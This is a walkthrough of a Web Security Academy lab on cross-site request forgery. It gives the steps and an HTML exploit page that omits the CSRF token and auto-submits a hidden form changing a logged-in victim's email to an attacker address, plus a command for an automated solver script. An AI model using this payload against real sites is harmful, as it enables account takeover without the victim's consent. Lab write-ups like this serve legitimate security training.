# CSRF LAB 03 - CSRF where token validation depends on token being present

## Manual Solution

- Open the Web Security Academy lab environment in your browser.
- Log in with the credentials: username:wiener password:peter.
- Open your browser’s Developer Tools and switch to the Network tab.
- While logged in attempt to change your email address from the account settings page.
- Observe the request sent to the /my-account/change-email endpoint.
- Notice that the request contains a `CSRF` token.
- Go to the Exploit Server and paste the following HTML payload into the body of the page:
```html
    <html>
        <body>
            <form action="https://[YOUR_LAB_ID].web-security-academy.net/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="hacker@hacker.com">
            </form>

            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
```
- Save and deliver the exploit to the victim.
- This lab contains a CSRF token but the web application doesn't validate the CSRF token.
## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python csrf_lab_03.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
```
